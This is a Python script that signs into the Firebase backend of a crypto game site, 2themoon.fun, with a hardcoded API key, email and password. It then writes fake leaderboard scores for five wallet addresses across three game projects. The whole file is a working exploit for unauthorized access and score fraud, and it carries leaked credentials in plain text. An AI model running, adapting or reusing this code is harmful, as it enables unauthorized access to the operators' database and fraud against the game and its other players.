from requests import get, post
from urllib3 import disable_warnings
from urllib import parse
from json import loads
from random import randint

disable_warnings()

PROJECTS = ['To The Moon', 'In The Woods', 'Spiky Walls']
WALLETS = ['0x2b17a68573381f12e768e9507f1d6F5361CCA1DF', '0xa94B40e1EB8b87a79510fD15f98c0fb986dcD4f1', '0x5ccd2F57fD869A95AE12e8aE964943e042F1e1EB', '0x1Ef52318070b3081b1a31783730158F7cc55c355', '0x662B8eF4dBCE6c0e09AbC2C575080dc6556df3c5']

def get_scoreboard(gsessionid, sid):
    headers = {
        'Host': 'firestore.googleapis.com',
        'Connection': 'close',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'sec-ch-ua-platform': '"Linux"',
        'Accept': '*/*',
        'Origin': 'https://www.2themoon.fun',
        'X-Client-Data': 'CKG1yQEIjrbJAQijtskBCKmdygEIn/nLAQjmhMwBCLWFzAEIy4nMAQjSj8wBGIyeywE=',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.2themoon.fun/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('gsessionid', gsessionid),
        ('VER', '8'),
        ('RID', 'rpc'),
        ('SID', sid),
        ('CI', '0'),
        ('AID', '0'),
        ('TYPE', 'xmlhttp'),
        ('zx', 'c8dp0ajd163x'),
        ('t', '2'),
    )

    response = get('https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel', headers=headers, params=params, verify=False)
    print(response.text)


def step_1():
    headers = {
        'authority': 'www.googleapis.com',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        'content-type': 'application/json',
        'x-client-version': 'Chrome/JsCore/7.19.1/FirebaseCore-web',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'sec-ch-ua-platform': '"Linux"',
        'accept': '*/*',
        'origin': 'https://www.2themoon.fun',
        'x-client-data': 'CIu2yQEIpLbJAQipncoBCJ75ywEI5oTMAQi1hcwBCMuJzAEImY/MAQjSj8wBGIyeywE=',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.2themoon.fun/',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
    }

    params = (
        ('key', 'AIzaSyBqZaJ2fN-YUyVbmTo2ccO5T0fhhi2_wUg'),
    )

    data = '{"email":"playground.app@game.com","password":"zz___zzj6;ffd]@U8CW31123@nEw<","returnSecureToken":true}'

    response = post('https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword', headers=headers, params=params, data=data)
    
    print(response.text)

    return loads(response.text)['idToken']
    
def step_2(idToken):
    headers = {
        'authority': 'firestore.googleapis.com',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'sec-ch-ua-platform': '"Linux"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.2themoon.fun',
        'x-client-data': 'CIu2yQEIpLbJAQipncoBCJ75ywEI5oTMAQi1hcwBCMuJzAEImY/MAQjSj8wBGIyeywE=',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.2themoon.fun/',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('VER', '8'),
        ('RID', '79808'),
        ('CVER', '22'),
        ('X-HTTP-Session-Id', 'gsessionid'),
        ('$httpHeaders', 'X-Goog-Api-Client:gl-js/ fire/7.19.1\r\nContent-Type:text/plain\r\nAuthorization:Bearer {}\r\n'.format(idToken)),
        ('zx', 'b9y3u8e94cl3'),
        ('t', '1'),
    )

    data = {
    'count': '1',
    'ofs': '0',
    'req0___data__': '{"database":"projects/playground-bsc/databases/(default)"}'
    }

    response = post('https://firestore.googleapis.com/google.firestore.v1.Firestore/Write/channel', headers=headers, params=params, data=data)

    return [response.headers['X-HTTP-Session-Id'], response.text.split(',')[2].replace('"','')]

def step_3(gsessionid, sid, project_name, wallet_address, score_value):
    headers = {
        'authority': 'firestore.googleapis.com',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'sec-ch-ua-platform': '"Linux"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://www.2themoon.fun',
        'x-client-data': 'CIu2yQEIpLbJAQipncoBCJ75ywEI5oTMAQi1hcwBCMuJzAEImY/MAQjSj8wBGIyeywE=',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.2themoon.fun/',
        'accept-language': 'en-US,en;q=0.9,pt;q=0.8',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('VER', '8'),
        ('gsessionid', gsessionid),
        ('SID', sid),
        ('RID', '79809'),
        ('AID', '1'),
        ('zx', 'z4lzu1jj5ojt'),
        ('t', '1'),
    )

    stream = {"streamToken":"GRBoQgKB9LW1","writes":[{"update":{"name":"projects/playground-bsc/databases/(default)/documents/{}/{}".format(project_name, wallet_address),"fields":{"wallet":{"stringValue":"{}".format(wallet_address)},"score":{"integerValue":"{}".format(score_value)}}}}]}

    data = 'count=1&ofs=1&req0___data__=' + parse.quote(str(stream).replace("'", '"').encode('utf8')) 

    response = post('https://firestore.googleapis.com/google.firestore.v1.Firestore/Write/channel', headers=headers, params=params, data=data)
    print(response.text)

def generate_score():
    return randint(6100, 6300)

def main():
    for project in PROJECTS:
        for wallet in WALLETS:
            print('Step 1 Executed')
            idToken = step_1()

            print('Step 2 Executed')
            gsessionid, sid = step_2(idToken)
            
            print('Step 3 Executed')
            score = generate_score()
            step_3(gsessionid, sid, project, wallet, score)

            print('[+] Score: {} | Wallet: {} | Project: {}'.format(score, wallet, project))
            print()

if __name__ == '__main__':
    main()